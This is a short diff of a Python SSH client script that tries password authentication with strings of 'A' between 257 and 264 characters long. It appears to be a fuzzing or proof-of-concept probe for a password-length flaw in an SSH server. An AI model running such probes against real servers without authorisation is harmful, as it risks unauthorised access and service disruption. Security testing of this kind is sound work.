@@ -34,7 +34,7 @@ def connect(host, port, user, key=None, password=None, timeout=10):
     sock = socket.create_connection((host, port), timeout=timeout)
     t = paramiko.Transport(sock)
     t.start_client(timeout=timeout)
-    for pwl in range(257,259): 
+    for pwl in range(257,265): 
         try:
             print(f"trying password: 'A'*{pwl}")
             t.auth_password(user, "A" * pwl)
